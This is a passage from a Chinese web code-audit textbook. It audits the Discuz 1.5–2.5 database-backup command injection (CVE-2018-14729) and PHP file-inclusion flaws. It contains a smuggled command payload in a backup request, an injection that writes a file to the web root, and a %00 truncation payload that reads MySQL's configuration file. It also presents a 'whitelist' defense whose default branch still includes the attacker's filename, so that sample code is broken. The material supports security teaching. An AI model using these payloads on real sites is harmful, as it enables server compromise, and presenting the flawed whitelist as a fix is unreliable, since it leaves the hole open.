\u672C\u5B9E\u9A8C\u5C06\u5BF9Discuz\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u6570\u636E\u5E93\u5907\u4EFD\u6A21\u5757\u662F\u5426\u5B58\u5728\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u3002\u8BE5\u6F0F\u6D1E\u5F71\u54CD\u7684\u7248\u672C\u4E3ADiscuz1.5\u81F32.5\u7248\u672C\uFF0C\u6F0F\u6D1E\u7F16\u53F7\u4E3ACVE-2018-14729\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80036.3.2\u8282\uFF1A\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u5E38\u89C1\u51FD\u6570\uFF1B6.3.4\u8282\uFF1A\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u5BA1\u8BA1\u7ECF\u9A8C\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1BDiscuz 1.5\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09\u5BA1\u8BA1\u9636\u6BB5\r
\r
\u5BF9Discuz\u8FDB\u884C\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u5BA1\u8BA1\uFF0C\u5168\u5C40\u641C\u7D22\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u7684\u5E38\u89C1\u51FD\u6570\u3002\u5168\u5C40\u641C\u7D22shell_exec\u51FD\u6570\u5982\u56FE6-30\u6240\u793A\uFF0C\u53EF\u4EE5\u53D1\u73B0shell_exec\u51FD\u6570\u5B58\u5728\u4E09\u5904\uFF0C\u5BA1\u8BA1\u8FD9\u4E09\u5904\u51FD\u6570\u662F\u5426\u5B58\u5728\u53EF\u63A7\u53C2\u6570\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image386.jpg)\r
\r
\u56FE6-30 \u5168\u5C40\u641C\u7D22shell_exec\u56FE\r
\r
\`\`\`\r
\u5728source\\admincp\\admincp_db.php\u7684287\u884C\u5B58\u5728shell_exec\u51FD\u6570\uFF0C\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
@shell_exec($mysqlbin.'mysqldump --force --quick '.($db->version() > '4.1' ?'--skip-opt --create-options' : '-all').' --add-drop-table'.($_G['gp_extendins'] == 1 ?' --extended-insert' : '').''.($db->version() > '4.1' && $_G['gp_sqlcompat'] == 'MYSQL40' ?' --compatible=mysql40' : '').' --host="'.$dbhost.($dbport ? (is_numeric($dbport) ?' --port='.$dbport : ' --socket="'.$dbport.'"') : '').'" --user="'.$dbuser.'" --password="'.$dbpw.'" "'.$dbname.'" '.$tablesstr.' > '.$dumpfile);\r
\r
\u8BE5\u51FD\u6570\u4E2D\u4F20\u9012\u7684\u53C2\u6570\u5305\u62EC\uFF1A$mysqlbin\u3001$db\u3001$dbhost\u3001$dbport\u3001$dbuser\u3001$dupw\u3001$tablesstr\u7B49\u3002\u901A\u8FC7\u53C2\u6570\u56DE\u6EAF\u8FFD\u8E2A\u6CD5\uFF0C\u53D1\u73B0\u5927\u90E8\u5206\u53C2\u6570\u90FD\u662F\u901A\u8FC7\u8BFB\u53D6config_global.php\u6587\u4EF6\u83B7\u53D6\u7684\uFF0Cconfig_global.php\u6587\u4EF6\u90E8\u5206\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
$_config['db']['1']['dbhost'] = 'localhost';//\u8FDE\u63A5\u6570\u636E\u5E93IP\r
$_config['db']['1']['dbuser'] = 'root';//\u8FDE\u63A5\u6570\u636E\u5E93\u7528\u6237\u540D\r
$_config['db']['1']['dbpw'] = 'root'; //\u8FDE\u63A5\u6570\u636E\u5E93\u5BC6\u7801\r
$_config['db']['1']['dbcharset'] = 'gbk'; //\u8FDE\u63A5\u6570\u636E\u5E93\u7F16\u7801\u65B9\u5F0F\r
\r
\u4EE3\u7801\u4E2D\u7528\u6237\u552F\u4E00\u53EF\u63A7\u53C2\u6570\u4E3A$tablesstr\uFF0C\u4F7F\u7528\u654F\u611F\u53C2\u6570\u56DE\u6EAF\u6CD5\u5BA1\u8BA1$tablesstr\u53C2\u6570\u7684\u4F20\u9012\u8FC7\u7A0B\u3002\u641C\u7D22\u8BE5\u6587\u4EF6\u53D1\u73B0$tablesstr\u53C2\u6570\u901A\u8FC7$tables\u8FDB\u884C\u904D\u5386\u83B7\u5F97\uFF0C\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\`\`\`\r
\r
\r
\r
\`\`\`\r
$tablesstr = '';\r
foreach($tables as $table) {   //\u904D\u5386tables\u53D8\u91CF\r
$tablesstr .= '"'.$table.'" ';\r
}\r
\r
\`\`\`\r
\r
\u5BA1\u8BA1$tables\u53D8\u91CF\u7684\u83B7\u53D6\u6D41\u7A0B\uFF0Csource\\admincp\\admincp_db.php\u6587\u4EF6\u4EE3\u7801\u5982\u56FE6-32\u6240\u793A\u3002$tables\u53D8\u91CF\u5728\u8BE5\u6587\u4EF6\u7684124\u884C\u88AB\u8D4B\u503C\uFF0C\u6570\u636E\u6D41\u7A0B\u4E3A\uFF1A\r
\r
l \u6839\u636Egp_type\u7C7B\u578B\u5224\u65AD\u6267\u884C\u6D41\u7A0B\uFF0C\u82E5gp_type\u7C7B\u578B\u662Fdiscuz\uFF0C\u5219\u6267\u884C$tables = arraykeys2(fetchtablelist($tablepre), 'Name');\r
\r
l \u82E5gp_type\u7C7B\u578B\u662Fcustom\u4E14 gp_setup\u4E3A\u7A7A\uFF0C\u5219\u6267\u884C\u67E5\u8BE2\u8BED\u53E5\u5E76\u5C06\u6267\u884C\u7ED3\u679C\u8D4B\u503C\u7ED9$tables = unserialize($tables['svalue']);\r
\r
l \u82E5gp_type\u7C7B\u578B\u662Fcustom\u4E14gp_setup\u4E0D\u4E3A\u7A7A\uFF0C\u5C06gp_customtables\u5B57\u6BB5\u5185\u5BB9\u5199\u5165\u6570\u636E\u5E93\u8868common_setting\uFF0C\u518D\u8D4B\u503C\u7ED9$tables\u3002\r
\r
\u81F3\u6B64\u6F0F\u6D1E\u4EA7\u751F\u539F\u56E0\u662Fshell_exec()\u4E2D\u7684$tablesstr\u53EF\u63A7\uFF0C\u5BFC\u81F4\u4EE3\u7801\u6CE8\u5165\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image388.jpg)\u56FE6-31 $tables\u8D4B\u503C\u4EE3\u7801\r
\r
\u901A\u8FC7\u5BA1\u8BA1admincp_db.php\u6587\u4EF6\uFF0C\u53EF\u53D1\u73B0\u82E5\u80FD\u591F\u8C03\u7528\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\uFF0C\u9700\u8981\u7684\u6761\u4EF6\u5305\u62EC\uFF1A\r
\r
l $operation==\u2019export\u2019\uFF1B\r
\r
l $_GET[\u2018type\u2019]==\u2019custom\u2019\uFF1B\r
\r
l $_GET[\u2018setup\u2019]\u548C$_GET[\u2018customtables\u2019]\u975E\u7A7A\uFF1B\r
\r
l $_GET[\u2018method\u2019]!=\u2018multivol\u2019\r
\r
\u624D\u80FD\u591F\u5B8C\u6210\u4EE3\u7801\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u7ED9\u51FA\u51FD\u6570\u8C03\u7528\u6808\uFF0C\u5982\u56FE6-32\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image390.jpg)\r
\r
\u56FE6-32 \u51FD\u6570\u8C03\u7528\u6D41\u7A0B\u56FE\r
\r
\uFF082\uFF09\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u5229\u7528\r
\r
\u9996\u5148\u767B\u9646Discuz\u7BA1\u7406\u5E73\u53F0\uFF0CURL\u8DEF\u5F84\uFF1Ahttp://ip/ discuz/admin.php\u3002\u7528\u6237\u540D\u4E3Aadmin\uFF0C\u5BC6\u7801password\uFF0C\u767B\u5F55\u9875\u9762\u5982\u56FE6-33\u6240\u793A\u3002\u5BF9\u5176\u8FDB\u884C\u6570\u636E\u5E93\u5907\u4EFD\u64CD\u4F5C\uFF0C\u7136\u540E\u4F7F\u7528BurpSuite\u6293\u53D6\u8BE5\u6570\u636E\u5305\u8FDB\u884C\u5206\u6790\uFF0C\u6570\u636E\u5305\u5982\u56FE6-34\u6240\u793A\u3002\r
\r
\u6570\u636E\u5305\u8F6C\u5305\u540E\uFF0C\u5BF9HTTP\u7684POST\u8BF7\u6C42\u4F53\u4E2D\u7684customtables\u5185\u5BB9\u8FDB\u884C\u4FEE\u6539\uFF0C\u5176\u4FEE\u6539\u5185\u5BB9\u4E3Acustomtables%5B%5D=pre_common_admincp_cmenu">aaa; echo helloworld > test.php\u3002\u8F6C\u53D1\u6210\u529F\u540E\uFF0C\u5C06\u6210\u529F\u6267\u884C\u547D\u4EE4\uFF1Aecho helloworld > test.php\uFF0C\u5728\u7F51\u7AD9\u76EE\u5F55\\discuz\u6587\u4EF6\u5939\u4E0B\u521B\u5EFA\u6076\u610F\u7F51\u7AD9test.php\u6587\u4EF6\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image392.jpg)\r
\r
\u56FE6-33 Discuz\u7BA1\u7406\u5E73\u53F0\u9875\u9762\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image394.jpg)\r
\r
\u56FE6-34 \u6570\u636E\u5305\u62E6\u622A\u56FE\r
\r
## 6.5 \u5355\u5143\u5C0F\u7ED3\r
\r
\u672C\u5355\u5143\u4E3B\u8981\u5B66\u4E60\u4E86\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u7684\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u4E0E\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\uFF0C\u901A\u8FC7\u8FD9\u4E24\u79CD\u6F0F\u6D1E\u7684\u5E38\u89C1\u6F0F\u6D1E\u51FD\u6570\u8FDB\u884C\u5217\u4E3E\uFF0C\u4F7F\u8BFB\u8005\u719F\u6089\u5E38\u89C1\u7684\u5BA1\u8BA1\u4EE3\u7801\u6267\u884C\u4E0E\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u7684\u65B9\u6CD5\u3002\u4E0E\u6B64\u540C\u65F6\uFF0C\u7ED9\u51FA\u5B58\u5728\u6F0F\u6D1E\u7684CMS\u5BA1\u8BA1\u6D41\u7A0B\uFF0C\u5305\u62EC\uFF1AYCCMS\u3001YzmCMS\u3001Discuz\u3002\r
\r
\u672C\u5355\u5143\u8981\u6C42\u8BFB\u8005\u7740\u91CD\u638C\u63E1\u4EE3\u7801\u6267\u884C\u3001\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u4E2D\u5E38\u89C1\u51FD\u6570\u7684PHP\u4EE3\u7801\u5F62\u5F0F\uFF0C\u5E76\u901A\u8FC7\u5BF9\u5C0F\u578BCMS\u7684\u4EE3\u7801\u8D70\u8BFB\u5BA1\u8BA1\u4EE3\u7801\u5176\u4E2D\u5B58\u5728\u7684\u6F0F\u6D1E\u3002\r
\r
# \u5355\u51437 \u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u5BA1\u8BA1\r
\r
\u672C\u5355\u5143\u4ECB\u7ECD\u4E86\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u5BA1\u8BA1\uFF0C\u5176\u4E3B\u8981\u5206\u4E3A\u56DB\u4E2A\u90E8\u5206\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\u7B2C\u4E00\u90E8\u5206\u4E3B\u8981\u4ECB\u7ECD\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u7684\u57FA\u7840\u77E5\u8BC6\uFF0C\u5305\u62EC\uFF1A\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u7684\u57FA\u672C\u6982\u5FF5\u3001\u6F0F\u6D1E\u5E38\u89C1\u51FD\u6570\u7684\u4EE3\u7801\u5206\u6790\u3001\u5BA1\u8BA1\u65B9\u6CD5\u3001\u6F0F\u6D1E\u9632\u5FA1\u65B9\u6CD5\u7B49\u3002\r
\r
\u7B2C\u4E8C\u90E8\u5206\u4ECB\u7ECD\u6587\u4EF6\u5305\u542B\u6F0F\u6D1EPHP\u4EE3\u7801\uFF0C\u8BA9\u8BFB\u8005\u4E86\u89E3\u6F0F\u6D1E\u4EE3\u7801\u6848\u4F8B\u3002\r
\r
\u7B2C\u4E09\u90E8\u5206\u4ECB\u7ECD\u5E38\u89C1\u7684\u9650\u5236\u540E\u7F00\u540D\u7684\u67D3\u8FC7\u65B9\u5F0F\uFF0C\u5305\u62EC\uFF1A%00\u3001\u8D85\u8FC7\u76EE\u5F55\u9650\u5236\u3001\u7B26\u53F7\u7ED5\u8FC7\u7B49\u3002\r
\r
\u7B2C\u56DB\u90E8\u5206\u4F7F\u7528phpmyadmin4.8.1\u3001\u7EC7\u68A6CMS5.7\u8FDB\u884C\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u5BA1\u8BA1\u5B9E\u8DF5\u3002\r
\r
**\u5355\u5143\u6784\u56FE\uFF1A**\r
\r
**![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image396.jpg)**\r
\r
**\u5355\u5143\u76EE\u6807\uFF1A**\r
\r
\\1.  \u719F\u6089\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u7684\u5E38\u89C1\u9AD8\u5371\u51FD\u6570\uFF1B\r
\r
\\2.  \u4E86\u89E3\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u7684\u6316\u6398\u6280\u5DE7\uFF1B\r
\r
\\3.  \u638C\u63E1\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u7684\u5E38\u89C1\u4EE3\u7801\u5BA1\u8BA1\u65B9\u6CD5\uFF1B\r
\r
\\4.  \u638C\u63E1\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u7684\u9632\u5FA1\u65B9\u6CD5\u3002\r
\r
## 7.1 \u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u6316\u6398\r
\r
### 7.1.1 \u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u7B80\u4ECB\r
\r
\u5F88\u591AWeb\u7F51\u7AD9\u5728\u5F00\u53D1\u65F6\u90FD\u4F1A\u4F7F\u7528\u6587\u4EF6\u5305\u542B\u65B9\u5F0F\u5C06\u516C\u7528\u51FD\u6570\u5305\u542B\u8FDB\u6765\uFF0C\u5176\u4F18\u70B9\u662F\u516C\u7528\u4EE3\u7801\u53EF\u4EE5\u5199\u5728\u4E00\u4E2A\u5355\u72EC\u7684\u6587\u4EF6\u4E0B\uFF0C\u5176\u4ED6\u6587\u4EF6\u5728\u4F7F\u7528\u65F6\u53EA\u9700\u5305\u542B\u8C03\u7528\u5373\u53EF\uFF0C\u4EE3\u7801\u65E0\u9700\u91CD\u590D\u7F16\u5199\u51CF\u5C11\u4EE3\u7801\u91CF\u3002\u5F88\u591A\u7A0B\u5E8F\u5728\u4F7F\u7528\u6587\u4EF6\u5305\u542B\u529F\u80FD\u65F6\uFF0C\u5C06\u5305\u542B\u7684\u6587\u4EF6\u53C2\u6570\u901A\u8FC7URL\u65B9\u5F0F\u52A8\u6001\u5305\u542B\u6587\u4EF6\uFF0C\u8FD9\u79CD\u65B9\u5F0F\u5728\u4E3A\u5F00\u53D1\u5E26\u6765\u4FBF\u5229\u7684\u540C\u65F6\u4E5F\u4EA7\u751F\u4E86\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u3002\r
\r
\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u662F\u6307\u5E94\u7528\u7A0B\u5E8F\u540E\u53F0\u4EE3\u7801\u5728\u8C03\u7528\u6587\u4EF6\u5305\u542B\u51FD\u6570\u65F6\uFF0C\u51FD\u6570\u53C2\u6570\u672A\u7ECF\u8FC7\u8FC7\u6EE4\u6216\u4E25\u683C\u5B9A\u4E49\uFF0C\u540C\u65F6\u7ED9\u53C2\u6570\u53EF\u4EE5\u88AB\u653B\u51FB\u8005\u7BE1\u6539\uFF0C\u5BFC\u81F4\u540E\u53F0\u4EE3\u7801\u5305\u542B\u4E86\u6076\u610F\u6587\u4EF6\u3002\u6587\u4EF6\u4E2D\u5C06\u5305\u542B\u6076\u610F\u4EE3\u7801\u5E76\u88AB\u6267\u884C\uFF0C\u4ECE\u800C\u8FBE\u5230\u653B\u51FB\u76EE\u7684\u3002\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u53EF\u80FD\u51FA\u73B0\u5728JSP\u3001PHP\u3001ASP\u7B49\u8BED\u8A00\u4E2D\uFF0CJSP\u548CASP\u8BED\u8A00\u4E2D\u53EA\u5B58\u5728\u672C\u5730\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\uFF0C\u800CPHP\u8BED\u8A00\u5219\u53EF\u80FD\u5B58\u5728\u672C\u5730\u6587\u4EF6\u5305\u542B\u548C\u8FDC\u7A0B\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u4E24\u79CD\uFF0C\u672C\u5355\u5143\u5C06\u4EE5PHP\u8BED\u8A00\u8FDB\u884C\u8BB2\u89E3\u3002\r
\r
### 7.1.2 \u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u5BA1\u8BA1\u7ECF\u9A8C\r
\r
\u5728\u5BF9\u4EE3\u7801\u8FDB\u884C\u767D\u76D2\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\uFF0C\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u70B9\u4E3B\u8981\u51FA\u73B0\u7684\u529F\u80FD\u70B9\u662F\uFF1A\u6A21\u677F\u52A0\u8F7D\u3001\u6A21\u5757\u52A0\u8F7D\u3001cache\u8C03\u7528\u3002\r
\r
\u5728\u6316\u6398\u6F0F\u6D1E\u767D\u76D2\u5BA1\u8BA1\u65F6\uFF0C\u4E3B\u8981\u9700\u8981\u786E\u5B9A\u5982\u4E0B\u51E0\u70B9\uFF1A\r
\r
\uFF081\uFF09\u6316\u6398\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u53EF\u4EE5\u5148\u8DDF\u8E2A\u4E00\u4E0B\u7A0B\u5E8F\u8FD0\u884C\u6D41\u7A0B\uFF0C\u67E5\u770B\u4EE3\u7801\u4E2D\u6A21\u5757\u52A0\u8F7D\u65F6\u5305\u542B\u7684\u6587\u4EF6\u662F\u5426\u53EF\u63A7\uFF1B\r
\r
\uFF082\uFF09\u5728\u6574\u4F53\u7684\u5E94\u7528\u7A0B\u5E8F\u4E2D\u76F4\u63A5\u641C\u7D22\u56DB\u4E2A\u6587\u4EF6\u5305\u542B\u51FD\u6570\uFF1A include()\u3001include_once()\u3001require()\u3001require_once()\u6765\u56DE\u6EAF\u67E5\u770B\u4F20\u9012\u53D8\u91CF\u662F\u5426\u53EF\u63A7\u3002\r
\r
### 7.1.3 \u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u9632\u5FA1\r
\r
\u672C\u5C0F\u8282\u7ED9\u51FA\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u7684\u9632\u5FA1\u65B9\u6CD5\uFF0C\u5176\u4E3B\u8981\u5305\u62EC\u5982\u4E0B\u51E0\u70B9\uFF1A\r
\r
\uFF081\uFF09\u767D\u540D\u5355\u8FC7\u6EE4\r
\r
\u5728\u4FEE\u590D\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u65F6\uFF0C\u53EF\u4EE5\u5728\u4EE3\u7801\u5C42\u8FDB\u884C\u6587\u4EF6\u8FC7\u6EE4\uFF0C\u5C06\u5305\u542B\u7684\u53C2\u6570\u8BBE\u7F6E\u4E3A\u767D\u540D\u5355\uFF0C\u4F8B\u5982\uFF1A\u7F51\u7AD9\u9700\u8981\u5305\u542B\u7684\u6587\u4EF6\u53EA\u6709index.php\u3001home.php\u3001admin.php\u8FD9\u4E09\u4E2A\u6587\u4EF6\uFF0C\u5C31\u53EF\u4EE5\u5C06\u8FD9\u4E09\u4E2A\u6587\u4EF6\u7684\u540D\u79F0\u5B9A\u4E49\u4E3A\u767D\u540D\u5355\uFF0C\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
  $filename = $_GET['filename'];\r
\r
  switch($filename){\r
\r
\u200B    case 'index':\r
\r
\u200B    case 'home':\r
\r
\u200B    case 'admin':\r
\r
\u200B      include '/var/www/html'.$filename.'.php';\r
\r
\u200B    break;\r
\r
\u200B    default:\r
\r
\u200B      include '/var/www/html'.$filename.'.php';\r
\r
  }\r
\r
?>\r
\r
\r
\r
\uFF082\uFF09\u670D\u52A1\u5668\u5B89\u5168\u914D\u7F6E\r
\r
\u670D\u52A1\u5668\u5B89\u5168\u914D\u7F6E\u4E3B\u8981\u6D89\u53CA\u4EE5\u4E0B\u4E24\u4E2A\u65B9\u9762\uFF1A\r
\r
l \u4FEE\u6539PHP\u7684\u914D\u7F6E\u6587\u4EF6\uFF0C\u5C06open_basedir\u7684\u503C\u8BBE\u7F6E\u4E3A\u53EF\u4EE5\u5305\u542B\u7684\u7279\u5B9A\u76EE\u5F55\uFF0C\u540E\u9762\u8981\u52A0/\uFF0C\u4F8B\u5982\uFF1Aopen_basedir=/var/www/html/\u3002\r
\r
l \u4FEE\u6539PHP\u7684\u914D\u7F6E\u6587\u4EF6\uFF0C\u5173\u95EDallow_url_include\uFF0C\u53EF\u4EE5\u9632\u6B62\u8FDC\u7A0B\u6587\u4EF6\u5305\u542B\u3002\r
\r
## 7.2 \u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u6848\u4F8B\r
\r
  \u672C\u5C0F\u8282\u5C06\u5BF9\u5E38\u89C1\u7684\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u8FDB\u884C\u4ECB\u7ECD\uFF0C\u901A\u8FC7\u5BF9\u5B58\u5728\u6F0F\u6D1E\u7684PHP\u4EE3\u7801\u8FDB\u884C\u767D\u76D2\u5BA1\u8BA1\uFF0C\u4ECE\u800C\u8BA9\u8BFB\u8005\u7406\u89E3\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u7684\u4EE3\u7801\u5F62\u5F0F\u3002\u6587\u4EF6\u5305\u542B\u662F\u6307\u5305\u542B\u6587\u4EF6\u7684\u4F4D\u7F6E\u5728\u672C\u5730\u7684\u670D\u52A1\u5668\uFF0C\u901A\u8FC7URL\u7684\u5F62\u5F0F\u76F4\u63A5\u8BFB\u53D6\u6587\u4EF6\u6216\u6267\u884C\u6076\u610F\u4EE3\u7801\uFF0C\u6F0F\u6D1E\u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
if ("$_GET[page]") {\r
\r
  include "$_GET[page]";\r
\r
} else {\r
\r
  include "home.php";}?>\r
\r
\r
\r
  \u4E0A\u8FF0\u4EE3\u7801\u901A\u8FC7HTTP\u7684GET\u65B9\u5F0F\u4F20\u9012\u53C2\u6570page\uFF0C\u7531\u4E8Epage\u53C2\u6570\u672A\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u53EF\u4EE5\u901A\u8FC7\u8BE5\u53C2\u6570\u67E5\u770B\u6587\u4EF6\u5185\u5BB9\uFF0C\u8F93\u5165\u8DEF\u5F84\uFF1Ahttp://192.168.0.11/main.php?page=111.txt\u8BBF\u95EE\u7F51\u7AD9\u6839\u8DEF\u5F84\u4E0B111.txt\u6587\u4EF6\uFF0C\u5982\u56FE7-1\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image398.gif)\r
\r
\u56FE7-1 \u672C\u5730\u6587\u4EF6\u5305\u542B\u6D4B\u8BD5\u56FE\r
\r
\u8FD8\u53EF\u4EE5\u901A\u8FC7\u6587\u4EF6\u5305\u542B\u529F\u80FD\u6267\u884C\u4EFB\u610F\u6269\u5C55\u540D\u7684\u6587\u4EF6\u4EE3\u7801\uFF0C\u5047\u8BBE111.txt\u6587\u4EF6\u5185\u5BB9\u4E3A<?php phpinfo();?>\u3002\u5229\u7528\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u5305\u542B111.txt\u6587\u4EF6\uFF0C\u5C31\u53EF\u4EE5\u6267\u884C\u6587\u4EF6\u4E2D\u7684PHP\u4EE3\u7801\u5E76\u8F93\u51FAphpinfo\u4FE1\u606F\uFF0C\u5982\u56FE7-2\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image400.gif)\r
\r
\u56FE7-2 \u672C\u5730\u6587\u4EF6\u5305\u542B\u6D4B\u8BD5\u56FE2\r
\r
## 7.3 \u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u7ED5\u8FC7\r
\r
\u672C\u5C0F\u8282\u5C06\u5BF9\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u4E2D\u540E\u7F00\u540D\u9632\u5FA1\u7684\u7ED5\u8FC7\u65B9\u5F0F\u8FDB\u884C\u4ECB\u7ECD\uFF0C\u5E38\u89C1\u7684\u7ED5\u8FC7\u65B9\u5F0F\u5206\u4E3A\u672C\u5730\u6587\u4EF6\u5305\u542B\u548C\u8FDC\u7A0B\u6587\u4EF6\u5305\u542B\u4E24\u7C7B\uFF0C\u5177\u4F53\u53EF\u5305\u62EC\uFF1A%00\u9636\u6BB5\u3001\u2026\u2026\u622A\u65AD\u3001./././.\u622A\u65AD\u3001\u7B26\u53F7\u622A\u65AD\u7B49\u3002\r
\r
### 7.3.1 \u6269\u5C55\u540D\u8FC7\u6EE4\u7ED5\u8FC7\uFF08\u672C\u5730\u6587\u4EF6\u5305\u542B\uFF09\r
\r
\u5728\u5E38\u89C1\u7684\u672C\u5730\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u4E2D\uFF0C\u5B58\u5728\u901A\u8FC7\u9650\u5236\u6587\u4EF6\u6269\u5C55\u540D\u7684\u65B9\u5F0F\u9632\u5FA1\u8BE5\u6F0F\u6D1E\uFF0C\u800C\u7ED5\u8FC7\u6587\u4EF6\u6269\u5C55\u540D\u5E38\u7528\u7684\u65B9\u6CD5\u5305\u62EC\u4E24\u79CD\u5206\u522B\u662F\uFF1A%00\u3001\u8DEF\u5F84\u957F\u5EA6\u622A\u65AD\u7ED5\u8FC7\u3002\r
\r
\uFF081\uFF09%00\u7ED5\u8FC7\r
\r
%00\u901A\u5E38\u88AB\u7A0B\u5E8F\u8BC6\u522B\u4E3A\u503C\u7684\u7ED3\u675F\u7B26\uFF0C\u5F53\u4F20\u9012\u53C2\u6570\u672B\u5C3E\u5305\u542B%00\u65F6\uFF0C\u5176\u540E\u9762\u7684\u6570\u636E\u5C06\u88AB\u76F4\u63A5\u5FFD\u7565\uFF0C\u5BFC\u81F4\u653B\u51FB\u8005\u53EF\u4EE5\u5229\u7528\u6B64\u65B9\u5F0F\u5C06\u6269\u5C55\u540D\u622A\u65AD\u7ED5\u8FC7\u6269\u5C55\u540D\u8FC7\u6EE4\u3002\r
\r
\u8BE5\u65B9\u6CD5\u7ED5\u8FC7\u6761\u4EF6\u5305\u62EC\uFF1Amagic_quotes_gpc=off\u548CPHP\u7248\u672C\u4F4E\u4E8E5.3.4\u3002\r
\r
\u6F0F\u6D1E\u4EE3\u7801\u6848\u4F8B\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
$filename=$_GET['filename'];\r
\r
include($filename.".html");?>\r
\r
\r
\r
\u4E0A\u8FF0PHP\u4EE3\u7801\u5C06\u6587\u4EF6\u540D\uFF08$filename\uFF09\u4E0E\u201C.html\u201D\u8FDB\u884C\u62FC\u63A5\uFF0C\u7531\u4E8E\u76EE\u524DPHP\u7248\u672C\u5C0F\u4E8E5.3.4\u4E14\u9B54\u672F\u5F15\u53F7GPC\u5173\u95ED\u72B6\u6001\uFF0C\u53EF\u4EE5\u4F7F\u7528%00\u622A\u65AD\u7ED5\u8FC7\u6B64\u7C7B\u62FC\u63A5\u65B9\u5F0F\u3002\u8F93\u5165\u8DEF\u5F84\u4E3A\uFF1Ahttp://127.0.0.1/include-labs/houzhuiraoguo.php?filename=../../MySQL/my.ini%00\r
\r
\u901A\u8FC7%00\u622A\u65AD\u4E86\u540E\u9762\u7684.html\u6269\u5C55\u540D\u8FC7\u6EE4\uFF0C\u6210\u529F\u8BFB\u53D6\u4E86my.ini\u6587\u4EF6\uFF08MySQL\u914D\u7F6E\u6587\u4EF6\uFF09\u5185\u5BB9\u3002\u8BBF\u95EE\u540E\u9875\u9762\u5982\u56FE7-3\u6240\u793A\uFF0C\u5176\u6210\u529F\u7ED5\u8FC7\u540E\u7F00\u540D\u9650\u5236\u8BFB\u53D6\u6587\u4EF6\u5185\u5BB9\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image402.jpg)\r
\r
\u56FE7-3 %00\u622A\u65AD\u6D4B\u8BD5\u56FE\r
\r
\uFF082\uFF09\u8DEF\u5F84\u957F\u5EA6\u622A\u65AD\u7ED5\u8FC7\r
\r
